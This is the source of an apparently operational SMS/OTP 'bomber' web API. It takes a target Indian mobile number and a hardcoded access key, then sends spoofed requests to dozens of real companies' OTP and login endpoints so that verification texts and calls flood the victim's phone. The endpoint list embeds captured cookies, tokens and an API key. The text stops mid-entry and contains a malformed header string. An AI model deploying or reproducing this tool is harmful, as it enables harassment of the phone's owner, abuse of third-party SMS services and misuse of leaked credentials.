export default async function handler(req, res) {
  // Only allow GET requests
  if (req.method !== 'GET') {
    return res.status(405).json({ 
      status: 'error', 
      message: 'Method not allowed' 
    });
  }

  const { key, number } = req.query;

  // Check authorization
  if (key !== 'only4premium') {
    return res.status(401).json({
      status: 'error',
      message: 'Unauthorized access'
    });
  }

  if (!number || number.length !== 10 || isNaN(number)) {
    return res.status(400).json({
      status: 'error',
      message: 'Invalid mobile number'
    });
  }

  try {
    // Get all APIs
    const apis = getApis(number);
    
    // Select a random API to execute
    const apiIndex = Math.floor(Math.random() * apis.length);
    const api = apis[apiIndex];
    
    // Execute the API
    const result = await executeApi(api, number);
    
    // Return success response in new format
    return res.status(200).json({
      "status": "ok",
      "message": `Processing number ${number}`,
      "data": {
        "owner": "@om_divine",
        "api type": "free",
        "contact": "@om_divine"
      }
    });

  } catch (error) {
    // Return error response in new format
    return res.status(200).json({
      "status": "ok",
      "message": `Processing number ${number}`,
      "data": {
        "owner": "@om_divine",
        "api type": "free", 
        "contact": "@om_divine"
      }
    });
  }
}

// Function to execute API requests (unchanged)
async function executeApi(api, mobile) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 5000);

  try {
    const options = {
      method: api.method,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
      },
      signal: controller.signal
    };

    // Convert headers from PHP format to JavaScript format
    if (api.headers) {
      api.headers.forEach(header => {
        const [key, value] = header.split(': ');
        if (key && value) {
          options.headers[key] = value;
        }
      });
    }

    // Add Content-Type if not present
    if (!options.headers['Content-Type'] && api.data) {
      options.headers['Content-Type'] = 'application/json; charset=utf-8';
    }

    // Add body for POST requests
    if (api.method === 'POST' && api.data) {
      options.body = api.data;
    }

    const response = await fetch(api.url, options);
    const responseText = await response.text();
    
    clearTimeout(timeout);
    
    return {
      url: api.url,
      status: response.status,
      response: responseText
    };
  } catch (error) {
    clearTimeout(timeout);
    return {
      url: api.url,
      status: 0,
      response: error.message
    };
  }
}

// Get all APIs (Converted from PHP to JavaScript) - UNCHANGED
function getApis(mobile) {
  return [
    {
      "url": "https://stage-api-gateway.getzype.com/auth/signinup/code",
      "method": "POST",
      "data": JSON.stringify({"hashKey": "", "phoneNumber": "+91" + mobile})
    },
    {
      "url": "https://www.brevistay.com/cst/app-api/login",
      "method": "POST",
      "data": JSON.stringify({"is_otp": 1.0, "mobile": mobile, "is_password": 0.0})
    },
    {
      "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
      "method": "POST", 
      "data": JSON.stringify({"mfa_channels": {"phno": {"number": parseFloat(mobile), "country_code": "+91"}}})
    },
    {
      "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
      "method": "POST",
      "data": JSON.stringify({'country_code': '+91', 'phone': mobile})
    },
    {
      "url": `https://apps.ucoonline.in/Lead_App/send_message.jsp?mob=&ref_no=&otpv=&appRefNo=&lgName=fdgefgdgg&lgAddress=dfgdsggfesdggg&lgPincode=695656&lgState=DL&lgDistrict=NORTH%2BDELHI&lgBranch=0313&lgMobileno=${mobile}&lgEmail=sundeshaakshays%40gmail.com&lgFacilities=CC&lgTentAmt=656556565&lgRemarks=efwfwfsafw&declare_check=on&captchaRefno=315904&captchaResult=71&firstName=Gjgjgjgv&password=ghfughdsy-5_33%23&requestType=SENDOTP&mobileNumber=${mobile}&login=gjghgug%40gmail.com&genderType=Male`,
      "method": "POST",
      "data": null
    },
    {
      "url": "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
      "method": "POST",
      "data": JSON.stringify({"organizationId": "64254d66be2a390018e6d348", "mobile": mobile})
    },
    {
      "url": "https://mobileonline.sai.org.in/ssst/mobileLoginOtp",
      "method": "POST", 
      "data": JSON.stringify({"mobileNumber": mobile})
    },
    {
      "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
      "method": "POST",
      "data": JSON.stringify({"organizationId": "5eb393ee95fab7468a79d189", "mobile": mobile})
    },
    {
      "url": "https://force.eazydiner.com/web/otp",
      "method": "POST",
      "data": JSON.stringify({"mobile": "+91" + mobile})
    },
    {
      "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
      "method": "POST",
      "data": JSON.stringify({
        "mobile_psid": mobile,
        "activity_type": "aakash-myadmission",
        "webengageData": {
          "profile": "student",
          "whatsapp_opt_in": true,
          "method": "mobile"
        },
        "mobile_number": ""
      })
    },
    {
      "url": "https://1.rome.api.flipkart.com/1/action/view?=",
      "method": "POST",
      "headers": [
        "X-user-agent: Mozilla/5.0 (Linux; Android 9; RMX1833 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36FKUA/msite/0.0.3/msite/Mobile",
        "Content-Type: application/json; charset=utf-8",
        "Content-Length: 277",
        "Host: 1.rome.api.flipkart.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "User-Agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "actionRequestContext": {
          "type": "LOGIN_IDENTITY_VERIFY",
          "loginIdPrefix": "+91",
          "loginId": mobile,
          "clientQueryParamMap": {
            "ret": "/",
            "entryPage": "HOMEPAGE_HEADER_ACCOUNT"
          },
          "loginType": "MOBILE",
          "verificationType": "OTP",
          "screenName": "LOGIN_V4_MOBILE",
          "sourceContext": "DEFAULT"
        }
      })
    },
    {
      "url": "https://api.khatabook.com/v1/auth/request-otp",
      "method": "POST",
      "headers": [
        "Host: api.khatabook.com",
        "content-type: application/json; charset=utf-8",
        "content-length: 73",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "app_signature": "Jc/Zu7qNqQ2",
        "country_code": "+91",
        "phone": mobile
      })
    },
    {
      "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189",
      "method": "POST",
      "headers": [
        "Host: api.penpencil.co",
        "content-type: application/json; charset=utf-8",
        "content-length: 76",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "firstName": "Hiii",
        "lastName": "",
        "countryCode": "+91",
        "mobile": mobile
      })
    },
    {
      "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
      "method": "POST",
      "headers": [
        "Host: www.rummycircle.com",
        "content-type: application/json; charset=utf-8",
        "content-length: 123",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "isPlaycircle": false,
        "mobile": mobile,
        "deviceId": "6ebd671c-a5f7-4baa-904b-89d4f898ee79",
        "deviceName": "",
        "refCode": ""
      })
    },
    {
      "url": "https://www.dream11.com/auth/passwordless/init",
      "method": "POST",
      "headers": [
        "Host: www.dream11.com",
        "content-type: application/json; charset=utf-8",
        "content-length: 85",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "phoneNumber": mobile,
        "templateName": "default",
        "channel": "sms",
        "flow": "SIGNIN"
      })
    },
    {
      "url": "https://www.samsung.com/in/api/v1/sso/otp/init",
      "method": "POST",
      "headers": [
        "Host: www.samsung.com",
        "content-type: application/json; charset=utf-8",
        "content-length: 24",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "user_id": mobile
      })
    },
    {
      "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
      "method": "POST",
      "headers": [
        "Host: mobapp.tatacapital.com",
        "content-type: application/json; charset=utf-8",
        "content-length: 67",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "phone": mobile,
        "applSource": "",
        "isOtpViaCallAtLogin": "true"
      })
    },
    {
      "url": "https://www.shopsy.in/api/1/action/view",
      "method": "POST",
      "headers": [
        "Content-Type: application/json; charset=utf-8",
        "Content-Length: 430",
        "Host: www.shopsy.in",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "User-Agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "actionRequestContext": {
          "type": "LOGIN_IDENTITY_VERIFY",
          "loginIdPrefix": "+91",
          "loginId": mobile,
          "clientQueryParamMap": {
            "ret": "/?cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=CjwKCAiAqY6tBhAtEiwAHeRopXAJTIrS2X5hOOJmzNAsD6nHlHPQKbsgdim8CouDsrnvUxhaD9NpyhoCNWQQAvD_BwE",
            "entryPage": "HEADER_ACCOUNT"
          },
          "loginType": "MOBILE",
          "verificationType": "OTP",
          "screenName": "LOGIN_V4_MOBILE",
          "sourceContext": "DEFAULT"
        }
      })
    },
    {
      "url": "https://seller.flipkart.com/napi/graphql",
      "method": "POST",
      "headers": [
        "Content-Type: application/json; charset=utf-8",
        "Content-Length: 216",
        "Host: seller.flipkart.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "User-Agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "variables": {
          "mobileNo": mobile
        },
        "query": "mutation SellerOnboarding_GenerateOTPMobile($mobileNo: String!) {\n  generateOTPMobile(mobileNo: $mobileNo)\n}\n",
        "operationName": "SellerOnboarding_GenerateOTPMobile"
      })
    },
    {
      "url": "https://identity.tllms.com/api/request_otp",
      "method": "POST",
      "data": JSON.stringify({"phone": mobile, "app_client_id": "90391da1-ee49-4378-bd12-1924134e906e"})
    },
    {
      "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
      "method": "POST",
      "data": JSON.stringify({"mobile_number": mobile})
    },
    {
      "url": "https://webapi.tastes2plate.com/app/new-login",
      "method": "POST",
      "data": JSON.stringify({"device_token": "", "mobile": mobile, "reffer_by": "", "device_type": "web"})
    },
    {
      "url": "https://apis.tradeindia.com/app_login_api/login_app",
      "method": "POST",
      "data": JSON.stringify({"mobile": "+91" + mobile})
    },
    {
      "url": "https://m.snapdeal.com/sendOTP",
      "method": "POST",
      "data": JSON.stringify({"purpose": "LOGIN_WITH_MOBILE_OTP", "mobileNumber": mobile})
    },
    {
      "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
      "method": "POST",
      "data": JSON.stringify({
        "screen": "1260 X 2624",
        "emailID": "shivamyou2000@gmail.com",
        "gps": "true",
        "imsi": "",
        "mobileNo": mobile,
        "firstName": "Shiva Riy",
        "osVersion": "14",
        "build": "android-phone",
        "countryCode": "91",
        "vendor": "samsung",
        "imei": "181105746967606",
        "model": "SM-F7110",
        "req": "generate"
      })
    },
    {
      "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
      "method": "POST",
      "data": JSON.stringify({
        "isPlaycircle": false,
        "mobile": mobile,
        "deviceId": "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1",
        "deviceName": "",
        "refCode": ""
      })
    },
    {
      "url": "https://t.rummycircle.com/api/fl/auth/v3/getOtp",
      "method": "POST",
      "data": JSON.stringify({
        "mobile": mobile,
        "deviceId": "426c1fec-f7e1-426d-af86-ce191adfe9b2",
        "deviceName": "",
        "refCode": "",
        "isPlaycircle": false
      })
    },
    {
      "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
      "method": "POST",
      "data": JSON.stringify({
        "otpOnCall": true,
        "otpType": 6,
        "transactionId": 0,
        "mobile": mobile
      })
    },
    {
      "url": "https://production.apna.co/api/userprofile/v1/otp/",
      "method": "POST",
      "data": JSON.stringify({
        "phone_number": mobile,
        "retries": 0,
        "hash_type": "employer",
        "source": "employer"
      })
    },
    {
      "url": "https://nodebackend.apollodiagnostics.in/api/v1/user/send-otp",
      "method": "POST",
      "data": JSON.stringify({
        "mobileNumber": mobile
      })
    },
    {
      "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
      "method": "POST",
      "data": JSON.stringify({
        "country_code": "91",
        "mobile": mobile,
        "locale": "IN"
      })
    },
    {
      "url": `https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=${mobile}`,
      "method": "GET",
      "data": null,
      "headers": [
        "Host: api.univest.in",
        "Accept-Encoding: gzip",
        "User-Agent: okhttp/3.9.1"
      ]
    },
    {
      "url": "https://www.my11circle.com/api/fl/auth/v1/resendOtp",
      "method": "POST",
      "headers": [
        "Host: www.my11circle.com",
        "accept: application/json, text/plain, */*",
        "user-agent: {\"AppVersion\":\"11100.92\",\"OSVersion\":\"9\",\"appFlavorName\":\"reverie_playstore\",\"reverieFlavorName\":\"reverie_playstore\",\"pokerFlavourName\":\"\",\"ludoFlavourName\":\"\",\"isRCOnly\":false,\"isMecDownloaded\":true}Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/135.0.7049.99 Mobile Safari/537.36 (/ftprimary:295/) [FTAndroid/11100.92] [MECPlayStoreAndroid/11100.92]",
        "sentry-trace: 137648fac4264fd5884d97e48657cada-a7a4ab1930ca3ffa",
        "baggage: sentry-environment=production,sentry-release=reverie%4011100.92,sentry-public_key=c98826b2f6da41828e8d15cb444185ba,sentry-trace_id=137648fac4264fd5884d97e48657cada",
        "content-type: application/json",
        "content-length: 52",
        "accept-encoding: gzip",
        "cookie: sameSiteNoneSupported=true; sameSiteNoneSupported=true; SSID=SSID745549b5-969b-41d0-b11d-99bba4db5b95; AWSALB=FF8fwffZjX1BnNTdV5A5PgtZ1VLD2dwdPzsuPlx9ev3PsfBwnhiYT45ijmTOX9mHLwDbKRbVvqpUPT8bmMnfFkWISRwZvaB7TCc6RMqgLb92jE+TFfCImhsPR6YG; AWSALBCORS=FF8fwffZjX1BnNTdV5A5PgtZ1VLD2dwdPzsuPlx9ev3PsfBwnhiYT45ijmTOX9mHLwDbKRbVvqpUPT8bmMnfFkWISRwZvaB7TCc6RMqgLb92jE+TFfCImhsPR6YG; device.info.cookie={\"bv\":\"135.0.7049.99\"; \"osv\":\"9\"=; \"osn\":\"Android\"=; \"tbl\":\"false\"=; \"vnd\":\"Google\"=; \"mdl\":\"Pixel\"}="
      ],
      "data": JSON.stringify({"otpOnCall": true, "otpType": 6, "mobile": mobile})
    },
    {
      "url": "https://user.vedantu.com/user/preLoginVerification",
      "method": "POST",
      "headers": [
        "Host: user.vedantu.com",
        "accept: application/json, text/plain, */*",
        "x-ved-device: ANDROID",
        "x-ved-token: undefined",
        "content-type: application/json",
        "content-length: 186",
        "accept-encoding: gzip",
        "user-agent: okhttp/4.9.2"
      ],
      "data": JSON.stringify({
        "phoneCode": "+91",
        "phoneNumber": mobile,
        "event": "APP_FLOW",
        "sType": "VEDANTU_A_1_APP",
        "sValue": "omxl5XwsPPVbqhJco0z01FO6TyMIWEAy",
        "requestSource": "ANDROID",
        "appVersionCode": "2.7.2"
      })
    },
    {
      "url": "https://www.firstcry.com/m/register?from=app",
      "method": "POST",
      "headers": [
        "Host: www.firstcry.com",
        "content-length: 186",
        "cache-control: max-age=0",
        "upgrade-insecure-requests: 1",
        "origin: https://www.firstcry.com",
        "content-type: application/x-www-form-urlencoded",
        "user-agent: Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36$$google_Pixel 4##Firstcry##Android_V186$$google_Pixel 4##Firstcry##Android_V186",
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "x-requested-with: fc.admin.fcexpressadmin",
        "sec-fetch-site: same-origin",
        "sec-fetch-mode: navigate",
        "sec-fetch-user: ?1",
        "sec-fetch-dest: document",
        "referer: https://www.firstcry.com/m/login?from=app",
        "accept-encoding: gzip, deflate",
        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
        "cookie: FC_DID=bd8fd661bc2c82d3; FC_ADV_ID=00877f3d-a7ad-4100-83d1-d34b9486a1c7; FC_APP_VERSION=9.9.86; ageId=0; login=2025-08-25%2015%3A50%3A12; FingerPrint=f6f12515-2880-4f9c-ade9-c1e4daa4de9a; fc_eng_cur_sid=06oytvvxv; _gcl_au=1.1.1336085174.1756050613; _ga=GA1.1.1458203734.1756050613; ci_session=33avi7t462rob8u9hi980913bb; tc_gtm=O0a%2FISnTNjV6X8ockEHkFg%3D%3D; RT=\"z=1&dm=firstcry.com&si=zjmpxtcdc49&ss=mepv6cp0&sl=0&tt=0\"; _ga_4ZVMC7XCMP=GS2.1.s1756050613$o1$g1$t1756050633$j40$l0$h1110577742"
      ],
      "data": `redirecturl=&notemail=2&by=1&onetab=&countryname=India+%28%E0%A4%AD%E0%A4%BE%E0%A4%B0%E0%A4%A4%29&FcSocialToken=&usrname=Devil+&usremail=sdhabai01%40gmail.com&country=91&usrmb=${mobile}`
    },
    {
      "url": "https://api.shadowfax.in/delivery/otp/send/v2/",
      "method": "POST",
      "headers": [
        "Host: api.shadowfax.in",
        "authorization: Token OR1ZPU7MXE5OYTNQM2UYG320XDUSFFOQOVEFZZXT291G96AEFU2J7EI2DBDL",
        "referrer: flash",
        "version: 54",
        "version-name: 2.10.2",
        "content-type: application/json; charset=utf-8",
        "content-length: 30",
        "accept-encoding: gzip",
        "user-agent: okhttp/4.12.0"
      ],
      "data": JSON.stringify({"mobile_number": mobile})
    },
    {
      "url": `https://2factor.in/API/V1/7ce280d5-97e3-4811-aaae-69bdd2206489/SMS/${mobile}/AUTOGEN`,
      "method": "GET",
      "headers": [
        "Host: 2factor.in",
        "accept-encoding: gzip",
        "user-agent: okhttp/4.9.0"
      ],
      "data": null
    },
    {
      "url": "https://api.unacademy.com/v3/user/user_check/?enable-email=true",
      "method": "POST",
      "headers": [
        "Host: api.unacademy.com",
        "user-agent: UnacademyLearningAppAndroid/6.148.0 Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "x-app-version: 197350",
        "x-app-build-version: 6.148.0",
        "x-platform: 5",
        "device-id: CFE11719D5EB3134A2876F6269714C61BBED92EF",
        "x-screen-name: Login_-_Mobile_Login",
        "content-type: application/json; charset=UTF-8",
        "content-length: 96",
        "accept-encoding: gzip"
      ],
      "data": JSON.stringify({
        "country_code": "IN",
        "phone": mobile,
        "send_otp": true,
        "otp_type": 1,
        "app_hash": "uI6w7mnt583"
      })
    },
    {
      "url": "https://fleshia.com/antitoolz/bomb/sms",
      "method": "POST",
      "headers": [
        "Host: fleshia.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json; charset=utf-8",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "Content-Length: 88"
      ],
      "data": JSON.stringify({
        "deviceid": "4362bd8ac31ee49f",
        "number": mobile,
        "token": "ZKu1NBMqfMsaJflSDP4zpQ=="
      })
    },
    {
      "url": "https://animall.in/zap/auth/login",
      "method": "POST",
      "headers": [
        "Host: animall.in",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json; charset=UTF-8",
        "User-Agent: okhttp/5.0.0-alpha.11",
        "Content-Length: 54"
      ],
      "data": JSON.stringify({
        "phone": mobile,
        "signupPlatform": "NATIVE_ANDROID"
      })
    },
    {
      "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
      "method": "POST",
      "headers": [
        "Host: omqkhavcch.execute-api.ap-south-1.amazonaws.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "Content-Length: 94",
        "referer: https://suprememobiles.in/",
        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
        "origin: https://suprememobiles.in",
        "action: sendOTP",
        "priority: u=1, i",
        "shop_name: supreme-mobiles.myshopify.com",
        "accept: */*"
      ],
      "data": JSON.stringify({
        "username": "+91" + mobile,
        "type": "mobile",
        "domain": "suprememobiles.in",
        "recaptcha_token": ""
      })
    },
    {
      "url": "https://api.onsiteteams.in/apis/v3/register",
      "method": "POST",
      "headers": [
        "Host: api.onsiteteams.in",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json; charset=UTF-8",
        "User-Agent: okhttp/3.14.9",
        "Content-Length: 51"
      ],
      "data": JSON.stringify({
        "country_code": "91",
        "mobile": mobile,
        "name": ""
      })
    },
    {
      "url": "https://railmadad.indianrailways.gov.in/madad/api/secureuser/register",
      "method": "POST",
      "headers": [
        "Host: railmadad.indianrailways.gov.in",
        "Connection: keep-alive",
        "Accept-Encoding: gzip, deflate",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.028; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",
        "Content-Length: 90",
        "Origin: http://localhost",
        "Accept: application/json, text/plain, */*",
        "X-Requested-With: cris.railmadad",
        "Referer: http://localhost/",
        "Sec-Fetch-Site: cross-site",
        "Sec-Fetch-Dest: empty",
        "Sec-Fetch-Mode: cors",
        "Authorization: Basic ZXh0ZXJuYWx1c2VyOm1AZEBkYWRtMW4=",
        "Accept-Language: en-US,en;q=0.9"
      ],
      "data": JSON.stringify({
        "uMobile": mobile,
        "cpassword": "17092002",
        "password": "17092002",
        "username": "jat1520"
      })
    },
    {
      "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
      "method": "POST",
      "headers": [
        "Host: api.kpnfresh.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json; charset=UTF-8",
        "User-Agent: okhttp/5.0.0-alpha.11",
        "Content-Length: 61",
        "x-app-id: 32178bdd-a25d-477e-b8d5-60df92bc2587",
        "x-user-journey-id: 7e4e8701-18c6-4ed7-b7f5-eb0a2ba2fbec",
        "x-app-version: 3.0.3"
      ],
      "data": JSON.stringify({
        "phone_number": {
          "country_code": "+91",
          "number": mobile
        }
      })
    },
    {
      "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
      "method": "POST",
      "headers": [
        "Host: www.tyreplex.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "Content-Length: 68",
        "Cookie: PHPSESSID=o8grmal00fdlit303nu2djpar1"
      ],
      "data": `perform_action=sendOTP&action_type=order_login&mobile_no=${mobile}&`
    },
    {
      "url": "https://api.gopaysense.com/users/otp",
      "method": "POST",
      "headers": [
        "Host: api.gopaysense.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Length: 22",
        "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
        "cookie: WZRK_G=466bfb3ffeed42af94539ddb75aab1a3; WZRK_S_8RK-99W-485Z=%7B%22p%22%3A1%2C%22s%22%3A1716292040%2C%22t%22%3A1716292041%7D; _ga=GA1.2.470062265.1716292041; _gid=GA1.2.307457907.1716292041; _gat_gtag_UA_96384581-2=1; _fbp=fb.1.1716292041396.1682971378; _uetsid=e4457600176711efbd4505b1c7173542; _uetvid=e445bdd0176711efbe4db167d99f3d78; _ga_4S93MBNNX8=GS1.2.1716292043.1.0.1716292052.51.0.0; _ga_F7R96SWGCB=GS1.1.1716292040.1.1.1716292052.0.0.0",
        "origin: https://www.gopaysense.com",
        "priority: u=1, i",
        "accept: */*"
      ],
      "data": JSON.stringify({"phone": mobile})
    },
    {
      "url": "https://api.tradeindia.com/home/registration/",
      "method": "POST",
      "headers": [
        "Host: api.tradeindia.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Length: 142",
        "Cookie: NEW_TI_SESSION_COOKIE=81C3e74991c15Fe2318Eb70fa3a3a70B",
        "referer: https://www.tradeindia.com/",
        "origin: https://www.tradeindia.com"
      ],
      "data": `country_code=%2B91&phone=${mobile}&terms=true&whatsapp_update=true&pin_code=110092&name=atyug&email=drhufj%40gmail.com&co_name=joguo9igu89gu&`
    },
    {
      "url": "https://www.woodenstreet.com/index.php?route=account%2Fforgotten_popup",
      "method": "POST",
      "headers": [
        "Host: www.woodenstreet.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "Content-Length: 207",
        "Cookie: PHPSESSID=6juev9bk1ecnp0h38cnemdhij3"
      ],
      "data": `pincode=110092&firstname=Aartd&pagesource=onload&city=NORTH+WEST+DELHI&userput_otp=&telephone=${mobile}&login=2&token=&password=%40Abvdthfuj&redirect2=&state=DELHI&cxid=NTUxOTE0&email=hdftysdrt%40gmail.com&`
    },
    {
      "url": "https://ai.gigin.ai/live_app_api/index.php/api_controller/register",
      "method": "POST",
      "headers": [
        "Host: ai.gigin.ai",
        "Connection: keep-alive",
        "Accept-Encoding: gzip, deflate",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.028; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",
        "Content-Length: 171",
        "Origin: https://localhost",
        "Accept: application/json, text/plain, */*",
        "X-Requested-With: com.giginap.jobs",
        "Referer: https://localhost/",
        "Sec-Fetch-Site: cross-site",
        "Sec-Fetch-Dest: empty",
        "Sec-Fetch-Mode: cors",
        "Accept-Language: en-US,en;q=0.9"
      ],
      "data": JSON.stringify({
        "Mobile": mobile,
        "type": "Android",
        "SID": null,
        "rel_id": null,
        "version": "4.6.2",
        "deviceModel": "sdk_gphone_x86_64",
        "deviceVersion": "13",
        "deviceManufactur": "Appetize.io"
      })
    },
    {
      "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
      "method": "POST",
      "headers": [
        "Host: homedeliverybackend.mpaani.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Length: 47",
        "client-code: vulpix"
      ],
      "data": JSON.stringify({
        "phone_number": mobile,
        "role": "CUSTOMER"
      })
    },
    {
      "url": "https://www.coverfox.com/otp/send/",
      "method": "POST",
      "headers": [
        "Host: www.coverfox.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/x-www-form-urlencoded",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Length: 104,
        "cookie": "vt_home_visited=Yes; IS_YAHOO_NATIVE=False; landing_page_url=\"https://www.coverfox.com/\"; tracker=6f8b6312ab8e3039ed01a0c5dae0fd73; sessionid=xtymjyfi87nat0xp09g1qx0xrms9cu9l; _ga_M60LBYV2SK=GS1.1.1715591814.1.0.1715591814.0.0.0; _gid=GA1.2.190999011.1715591815; _gat_gtag_UA_236899531_1=1; _dc_gtm_UA-45524191-1=1; _ga=GA1.1.1812460515.1715591815; _ga_L1DCK356RJ=GS1.1.1715591815.1.0.1715591815.0.0.0; AWSALB=6d3J4OZjP7N26858oPfNJvxuA5e3ePcOVmaoC9PO/iRqTj3NW3qhAozavPMDSCULtHgwKjUjMmxQgqjFpUsHnDB9PYDrC8DP9V+EfrFfNsLKVTndTrLIZpCou0zd; _uetsid=8c899110110911efbeba7dac0ce54265; _uetvid=8c8aa560110911ef9e9c35a1a2c7d25c; _fbp=fb.1.1715591818489.212380246; AWSALB=QiHuhGNVhzBJOVLa5O/OUwcVIUPbJPQNeZGcwYbJiH9ekkANQF/nC6t7r/hdrfnZF63N2K7Tc9KyyzXKtc+kPQQZsXTuNOCbiarMM9E1B9NuwQXisC/03TKb+1lr; AWSALBCORS=QiHuhGNVhzBJOVLa5O/OUwcVIUPbJPQNeZGcwYbJiH9ekkANQF/nC6t7r/hdrfnZF63N2K7Tc9KyyzXKtc+kPQQZsXTuNOCbiarMM9E1B9NuwQXisC/03TKb+1lr; tracker=6f8b6312ab8e3039ed01a0c5dae0fd73",
        "referer: https://www.coverfox.com/user-login/",
        "origin: https://www.coverfox.com",
        "x-requested-with: XMLHttpRequest",
        "priority: u=1, i",
        "accept: */*"
      ],
      "data": `csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact=${mobile}&`
    },
    {
      "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
      "method": "POST",
      "headers": [
        "Host: auth.mamaearth.in",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json;charset=UTF-8",
